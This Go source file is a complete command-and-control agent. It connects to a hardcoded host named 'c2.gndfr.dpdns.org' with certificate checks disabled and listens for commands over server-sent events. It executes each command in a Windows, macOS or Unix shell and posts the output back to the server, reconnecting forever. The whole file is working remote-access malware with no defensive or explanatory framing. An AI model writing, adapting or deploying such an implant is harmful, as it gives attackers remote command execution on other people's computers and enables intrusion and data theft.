package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func handleAgentConnection(serverAddress, agentID string) {
	sseURL := fmt.Sprintf("https://%s/commands?id=%s", serverAddress, agentID)
	resultURL := fmt.Sprintf("https://%s/result?id=%s", serverAddress, agentID)

	// Custom HTTP client to skip verification if needed (for self-signed certs)
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	for {
		fmt.Printf("Connecting to server SSE at %s...\n", sseURL)
		resp, err := httpClient.Get(sseURL)
		if err != nil {
			log.Printf("Failed to connect to server: %v. Retrying in 5s...\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("Connected. Listening for commands...")

		reader := bufio.NewReader(resp.Body)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					fmt.Println("Server closed the connection.")
				} else {
					log.Printf("Error reading SSE: %v\n", err)
				}
				break
			}

			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "data: ") {
				cmdStr := strings.TrimPrefix(line, "data: ")
				cmdStr = strings.TrimSpace(cmdStr)

				if cmdStr == "" {
					continue
				}

				fmt.Printf("\n[Command Received]: Executing '%s'...\n", cmdStr)
				var cmd *exec.Cmd
				if isWindows() {
					cmd = exec.Command("cmd", "/C", "chcp 65001 > nul && "+cmdStr)
				} else if isMac() {
					cmd = exec.Command("zsh", "-c", cmdStr)
				} else {
					cmd = exec.Command("sh", "-c", cmdStr)
				}

				output, err := cmd.CombinedOutput()
				result := strings.TrimSpace(string(output))
				if err != nil {
					result = fmt.Sprintf("Error executing: %s\n%s", err.Error(), result)
				}

				result += "\n"

				// Send result back to server
				resp, err := httpClient.Post(resultURL, "text/plain", bytes.NewBufferString(result))
				if err != nil {
					fmt.Println("Failed to send result:", err)
					continue
				}
				resp.Body.Close()
				fmt.Println("Result successfully sent to server.")
			}
		}

		fmt.Println("Connection lost. Retrying in 5 seconds...")
		time.Sleep(5 * time.Second)
	}
}

func agentMain() {
	serverAddress := "c2.gndfr.dpdns.org:443"
	agentID := "agent123" // Replace with unique ID in real deployment
	handleAgentConnection(serverAddress, agentID)
}

func main() {
	agentMain()
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}

func isMac() bool {
	return runtime.GOOS == "darwin"
}
